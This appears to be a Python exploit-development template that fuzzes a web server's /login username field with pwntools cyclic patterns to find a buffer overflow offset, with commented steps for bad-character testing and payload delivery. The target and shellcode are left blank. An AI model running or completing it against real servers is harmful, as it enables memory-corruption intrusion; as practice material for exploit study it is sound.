#!/bin/python3

import socket
import string
import requests
import time
import pwnlib.util.cyclic as pattern

addr = ""
port = 80
page = "/login"

shell =  b""

session = requests.session()
#session.proxies.update({ 'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'})

# --------- Fuzzing Server --------- #

def test_conn():
    print(f"[+] Testing connection to {addr} on port {port}")
    try:
        with socket.create_connection((addr, port)) as sock:
            print("[+] We can connect to the webserver")
    except e:
        print("[+] Server not available")

def fuzz_server(start,end,skip):
    for i in range(start,end,skip):
        fuzz = pattern.cyclic(i, alphabet=string.ascii_letters)
        body = {'username':fuzz,'password':'p'}
        print("[+] Fuzzing with {0} characters".format(len(fuzz)))
        r = session.post(f"http://{addr}:{port}{page}", data=body)
        time.sleep(3)

def check_pattern(s):
    print("[+] Checking pattern")
    index = pattern.cyclic_find(s, alphabet=string.ascii_letters)
    print("[+] Pattern at {}".format(index))
    exit(0)

# --------- Main --------- #

def main():
    test_conn()

main()

# Payload in body
#   body = {'username':payload,'password':'p'}
#   r = session.post(f"http://{addr}:{port}{page}", data=body)

# Bad Characters
#   tst = set([ i for i in range (0, 0x100) ])
#   bad = set([0x00])
#   payload = bytes(tst - bad)
